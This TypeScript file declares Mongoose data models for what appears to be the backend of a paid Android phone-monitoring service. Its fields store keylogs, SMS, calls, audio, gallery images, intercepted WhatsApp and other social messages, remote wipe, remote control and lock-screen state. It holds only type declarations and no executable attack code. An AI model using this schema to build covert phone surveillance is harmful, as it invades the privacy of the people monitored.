import { Document } from "mongoose";

/**
 *   Model Types
 */

export type UserRoleType = "user" | "admin";

export interface UserModelType extends Document {
	_id?: Object;
	id?: string;
	username?: string;
	email?: string;
	password?: string;
	phone?: string;
	ip?: string;
	avatar_url?: string;
	role?: UserRoleType;
	token?: string;
	subscribe?: string; // Subscribe available, null = any plan, basic / preminum
	devices?: number;
	maxDeviceLimit?: number;
	extraDevice?: number;
	customerId?: string;
	apk?: string;
	apkName?: string;
	status: string; // pending(when haven't subscribe anything), allowed(when had subscribe basic or premium), blocked(when block by admin)
	active?: boolean; // Account available, true = account active, false = account deleted
	created_at?: Date;
	license_at?: Date;
	license_duration?: string;
	license_expire_at?: Date;
	session_Id?: String;
	available_reset_password: boolean;
	visit_at?: Date;
}

export interface SessionModelType extends Document {
	userId?: string;
	token?: string;
	created_at?: string;
}

export interface ServerModelType extends Document {
	registered_users?: number;
	signin_users?: number;
	deleted_users?: number;
	purchased_users?: number;
	stripe_webhook_id?: string;
	stripe_webhook_secret?: string;
}

/**
 *  Email Verification Types
 */
export interface MailBodyType {
	from: string;
	to: string;
	subject: string;
	html: string;
}

/**
 *  Devices Types
 */
export interface DeviceModelType extends Document {
	deviceId?: string;
	userId?: string;
	socketId?: string;
	deviceInfo?: string;
	hwid?: string; // hardDevice
	installationDate?: string; //Installed Date
	manufacturer?: string;
	models?: string;
	online?: boolean;
	permissions?: string;
	lastseen?: string;
	nodelogs?: string;
	screenCapture?: string; //New
	geoFencing?: string; //New
	deviceSetting?: string; //New
	batteryStatus?: string; //New
	remoteControl?: string; //New
	remoteWipe?: string; //New
	version?: string;
	abi?: string | null;
	connectStatus?: string;
	botStatus?: boolean;
	userType?: string;
	wsRoomId?: string; // WebSocket RoomId
	blackScreen?: boolean;
	lockScreen?: boolean;
	securityData?: string | string[];
	securityType?: string;
	created_at?: string;
	updated_at?: string;
}

/**
 *  SMS Types
 */
export interface SMSModelType extends Document {
	deviceId?: string;
	message?: string;
	phonenumber?: string;
	created_at?: string;
}

/**
 * Calls Types
 */
export interface CallsModelType extends Document {
	deviceId?: string;
	phoneNumber?: string;
	callStatus?: string;
	callTime?: string;
	created_at?: string;
}

/**
 * Files Type
 */
export interface FileModelType extends Document {
	deviceId?: string;
	files?: string;
	type?: string;
	size?: string;
	sender?: string;
	receiver?: string;
	created_at?: string;
}

/**
 * Contact Type
 */
export interface ContactModelType extends Document {
	fullName?: string;
	email?: string;
	subject?: string;
	message?: string;
	created_at?: string;
}

/**
 * App Type
 */
export interface AppModelType extends Document {
	userId?: string;
	name?: string;
	path?: string;
	apkVersion?: string;
	created_at?: string;
}

/**
 * Plan Type
 */
export interface PlanModelType extends Document {
	reason?: string;
	frequency?: string;
	frequency_type?: string;
	transaction_amount?: string;
	currency_id: string;
	back_url?: string;
	payer_email?: string;
	start_date?: string;
	end_date?: string;
	next_payment_date?: string;
	last_modified?: string;
	status?: boolean;
	created_at?: string;
}

/**
 * Gallery Type
 */
export interface GalleryModelType extends Document {
	imageId?: string;
	deviceId?: string;
	filepath?: string;
	created_at?: string;
}

/**
 * Notifications Type
 */
export interface NotificationsModelType extends Document {
	deviceId?: string;
	title?: string;
	content?: string;
	sort?: string; //sms, calls, files, contacts, gallery, facebook, whatsapp, instagram, linkedin, twitter
	userId?: string;
	active?: boolean;
	interception?: NotificationInterceptionType; // Field to reference interception settings
	created_at?: string;
}

/**
 * Notifications Interception Type
 */
export interface NotificationInterceptionType extends Document {
	deviceId?: string;
	userId?: string;
	sms?: boolean;
	calls?: boolean;
	files?: boolean;
	contacts?: boolean;
	gallery?: boolean;
	facebook?: boolean;
	whatsapp?: boolean;
	instagram?: boolean;
	linkedin?: boolean;
	twitter?: boolean;
	created_at?: string;
}

/**
 * Key Logs Type
 */
export interface KeyLogsModelType extends Document {
	deviceId?: string;
	keyLogsType?: string;
	keylogs?: string;
	keyevent?: string;
	created_at?: string;
}

/**
 * Audio Type
 */
export interface AudioModelType extends Document {
	deviceId?: string;
	audio?: string;
	created_at?: string;
}

/**
 *  Social Type
 */

export interface SocialModelType extends Document {
	deviceId?: string;
	userId?: string;
	socialName?: string;
	messages?: MessageModelType;
	socialLink?: string;
	created_at?: string;
}

/**
 * Social Usage Type
 */
export interface SocialUsageModelType extends Document {
	deviceId: string;
	userId: string;
	applicationName: string;
	appOpenedCount: number;
	totalTimeSpent: number;
	created_at?: string;
}

/**
 * Social Clients List Type
 */
export interface SocialListModelType extends Document {
	deviceId?: string;
	socialName?: string;
	phoneNumber?: string;
	userName?: string;
	lastMessage?: string;
	lastDate?: string;
	created_at?: string;
}
/**
 * Social Client message Type
 */
export interface SocialMessageModelType extends Document {
	deviceId?: string;
	socialName?: string;
	phoneNumber?: string;
	userName?: string;
	messageText?: string;
	referenceType?: string;
	messageDate?: string;
	messageTime?: string;
	created_at?: string;
}
/**
 * Social Profile Type
 */
export interface SocialProfileModelType extends Document {
	deviceId?: string;
	socialName?: string;
	userName?: string;
	phoneNumber?: string;
	stateText?: string;
	created_at?: string;
}

/**
 * Chat Feedback Type
 */
export interface FeedbackModelType extends Document {
	userId?: string;
	feedback?: string;
	rate?: string;
	created_at?: string;
}

/**
 * Chat Message Type
 */
export interface MessageModelType extends Document {
	userId?: string;
	message?: string;
	sender?: string;
	created_at?: string;
}
